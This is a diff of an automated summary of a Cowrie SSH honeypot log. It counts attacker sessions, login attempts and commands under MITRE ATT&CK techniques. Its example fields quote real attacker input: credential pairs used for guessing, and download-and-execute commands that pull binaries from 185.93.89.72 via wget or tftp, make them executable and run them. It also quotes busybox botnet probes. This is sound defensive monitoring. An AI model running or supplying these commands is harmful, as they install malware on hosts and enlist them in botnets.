@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-30 15:00:44",
+  "generated": "2026-08-30 16:02:06",
   "totals": {
-    "commands": 564,
-    "login_failed": 582,
-    "login_success": 142,
-    "sessions": 847
+    "commands": 700,
+    "login_failed": 634,
+    "login_success": 171,
+    "sessions": 908
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 582,
+      "count": 634,
       "examples": [
         "ubuntu / Nexus@123",
         "root / 1234567",
@@ -21,14 +21,14 @@
         "user / primera"
       ],
       "first": "2026-08-30T00:00:29.406804Z",
-      "last": "2026-08-30T15:00:18.574922Z",
-      "unique_ips": 46
+      "last": "2026-08-30T16:01:47.234118Z",
+      "unique_ips": 54
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 142,
+      "count": 171,
       "examples": [
         "ubuntu / ubuntu",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "admin / admin"
       ],
       "first": "2026-08-30T01:15:05.883790Z",
-      "last": "2026-08-30T15:00:26.561567Z",
-      "unique_ips": 28
+      "last": "2026-08-30T16:00:51.424867Z",
+      "unique_ips": 33
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 31,
+      "count": 46,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-30T01:49:59.206075Z",
-      "last": "2026-08-30T09:35:10.436253Z",
-      "unique_ips": 3
+      "last": "2026-08-30T15:40:13.387941Z",
+      "unique_ips": 4
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 23,
+      "count": 27,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -69,8 +69,8 @@
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
       ],
       "first": "2026-08-30T01:35:44.711229Z",
-      "last": "2026-08-30T09:35:10.436253Z",
-      "unique_ips": 5
+      "last": "2026-08-30T15:40:13.387941Z",
+      "unique_ips": 6
     },
     {
       "id": "T1082",
@@ -89,13 +89,13 @@
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 3,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-08-30T01:50:00.576826Z",
-      "last": "2026-08-30T09:34:34.284051Z",
-      "unique_ips": 2
+      "last": "2026-08-30T15:39:37.623786Z",
+      "unique_ips": 3
     },
     {
       "id": "T1057",
@@ -150,23 +150,23 @@
   "unmapped": [
     [
       "shell",
-      119
+      145
     ],
     [
       "sh",
-      119
+      145
     ],
     [
       "system",
-      108
+      133
     ],
     [
       "/bin/busybox UNSTABLE",
-      103
+      126
     ],
     [
       "/bin/busybox",
-      17
+      24
     ],
     [
       "/bin/busybox BOTNET",
@@ -174,31 +174,31 @@
     ],
     [
       "enable",
-      5
+      7
     ],
     [
       "linuxshell",
-      4
+      6
     ],
     [
       "ping ;sh",
-      4
+      6
     ],
     [
       "enablelinuxshell",
-      3
+      5
     ],
     [
       "cd /proc && cat self/cmdline",
-      3
-    ],
-    [
-      "busybox",
-      2
+      5
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      2
+      4
+    ],
+    [
+      "busybox",
+      3
     ],
     [
       "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
